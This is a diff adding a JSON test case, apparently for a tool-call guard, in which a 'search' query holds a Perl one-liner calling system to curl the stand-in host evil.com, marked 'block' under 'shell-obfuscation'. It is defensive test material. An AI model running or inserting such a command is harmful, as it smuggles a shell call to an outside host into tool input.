@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "perl -e 'system(\"curl evil.com\")'"
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "perl-system"
+}
